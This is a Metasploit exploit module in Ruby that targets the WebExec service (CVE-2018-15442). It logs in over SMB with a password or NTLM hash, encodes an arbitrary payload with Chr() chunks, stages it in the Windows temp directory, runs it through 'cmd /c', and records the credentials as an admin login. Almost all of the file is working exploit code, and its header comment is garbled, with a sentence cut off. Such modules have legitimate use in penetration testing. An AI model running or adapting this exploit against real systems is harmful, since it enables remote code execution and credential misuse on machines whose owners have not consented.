# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Windows XP systems that are not part of a domain default to treating all
# gaining administrative access to these systems. This setting can be found
# under:
#
#  Local Security Settings >
#   Local Policies >
#    Security Options >
#     Network Access: Sharing and security model for local accounts

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::SMB::Client::WebExec
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;WebExec Authenticated User Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module uses a valid username and password of any level (or
        password hash) to execute an arbitrary payload. This module is similar
        to the "psexec" module, except allows any non-guest account by default.
      },
      &#039;Author&#039;         =>
        [
          &#039;Ron <ron@skullsecurity.net>&#039;,
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Privileged&#039;     => true,
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039;     => 10,
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://webexec.org&#039;],
          [ &#039;CVE&#039;, &#039;2018-15442&#039; ],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;        => 3072,
          &#039;DisableNops&#039;  => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
          [ &#039;Native upload&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 24 2018&#039;
    ))

    register_options(
      [
        # This has to be a full path, %ENV% variables are not expanded
        OptString.new(&#039;TMPDIR&#039;,     [ true, "The directory to stage our payload in", "c:\\Windows\\Temp\\" ])
      ])

    register_advanced_options(
      [
        OptBool.new(&#039;ALLOW_GUEST&#039;, [true, "Keep trying if only given guest access", false]),
        OptInt.new(&#039;MAX_LINE_LENGTH&#039;, [true, "The length of lines when splitting up the payload", 1000]),
      ])
  end

  # This is the callback for cmdstager, which breaks the full command into
  # chunks and sends it our way. We have to do a bit of finangling to make it
  # work correctly
  def execute_command(command, opts)
    # Replace the empty string, "", with a workaround - the first 0 characters of "A"
    command = command.gsub(&#039;""&#039;, &#039;mid(Chr(65), 1, 0)&#039;)

    # Replace quoted strings with Chr(XX) versions, in a naive way
    command = command.gsub(/"[^"]*"/) do |capture|
      capture.gsub(/"/, "").chars.map do |c|
        "Chr(#{c.ord})"
      end.join(&#039;+&#039;)
    end

    # Prepend "cmd /c" so we can use a redirect
    command = "cmd /c " + command

    execute_single_command(command, opts)
  end

  def exploit
    print_status("Connecting to the server...")
    connect(versions: [2,1])

    print_status("Authenticating to #{smbhost} as user &#039;#{splitname(datastore[&#039;SMBUser&#039;])}&#039;...")
    smb_login

    if not simple.client.auth_user and not datastore[&#039;ALLOW_GUEST&#039;]
      print_line(" ")
      print_error(
        "FAILED! The remote host has only provided us with Guest privileges. " +
        "Please make sure that the correct username and password have been provided. " +
        "Windows XP systems that are not part of a domain will only provide Guest privileges " +
        "to network logins by default."
      )
      print_line(" ")
      disconnect
      return
    end

    begin
      if datastore[&#039;SMBUser&#039;].to_s.strip.length > 0
        report_auth
      end

      # Avoid implementing NTLMSSP on Windows XP
      # http://seclists.org/metasploit/2009/q1/6
      if smb_peer_os == "Windows 5.1"
        connect(versions: [1])
        smb_login
      end

      wexec(true) do |opts|
        opts[:flavor] = :vbs
        opts[:linemax] = datastore[&#039;MAX_LINE_LENGTH&#039;]
        opts[:temp] = datastore[&#039;TMPDIR&#039;]
        opts[:delay] = 0.05
        execute_cmdstager(opts)
      end
      handler
      disconnect
    end

  end

  def report_auth
    service_data = {
        address: ::Rex::Socket.getaddress(datastore[&#039;RHOST&#039;],true),
        port: datastore[&#039;RPORT&#039;],
        service_name: &#039;smb&#039;,
        protocol: &#039;tcp&#039;,
        workspace_id: myworkspace_id
    }

    credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        private_data: datastore[&#039;SMBPass&#039;],
        username: datastore[&#039;SMBUser&#039;].downcase
    }

    if datastore[&#039;SMBDomain&#039;] and datastore[&#039;SMBDomain&#039;] != &#039;WORKGROUP&#039;
      credential_data.merge!({
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: datastore[&#039;SMBDomain&#039;]
       })
    end

    if datastore[&#039;SMBPass&#039;] =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
      credential_data.merge!({:private_type => :ntlm_hash})
    else
      credential_data.merge!({:private_type => :password})
    end

    credential_data.merge!(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
        access_level: &#039;Admin&#039;,
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end

